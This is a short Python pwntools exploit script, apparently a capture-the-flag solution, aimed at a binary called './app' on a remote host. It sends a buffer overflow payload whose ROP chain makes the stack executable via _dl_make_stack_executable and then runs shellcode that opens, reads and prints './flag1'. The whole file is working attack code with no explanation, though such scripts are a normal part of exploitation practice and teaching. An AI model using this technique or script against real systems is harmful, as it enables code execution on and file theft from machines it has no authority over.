#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./app"
elf = context.binary

#  io = elf.process()
io = remote("34.82.101.212", 10011)

payload = flat(
        '0' * 0x108,
        0x0000000000400686, # pop rdi; ret;
        elf.sym['__stack_prot'] - 8,
        0x0000000000415234, # pop rax; ret;
        7,
        0x0000000000416106, # mov qword ptr [rdi + 8], rax; ret;
        0x0000000000400686, # pop rdi; ret;
        elf.sym['__libc_stack_end'],
        elf.sym['_dl_make_stack_executable'],
        0x00000000004941fb, # jmp rsp;
        )

sc  = shellcraft.pushstr("./flag1")
sc += shellcraft.open("rsp")
sc += shellcraft.read("rax", "rsp", 0x100)
sc += shellcraft.write(1, "rsp", 0x100)

payload += asm(sc)

#  gdb.attach(io, "b *0x400B72\nc")
write("payload", payload)
io.sendline(payload)

print(io.recv())
io.close()
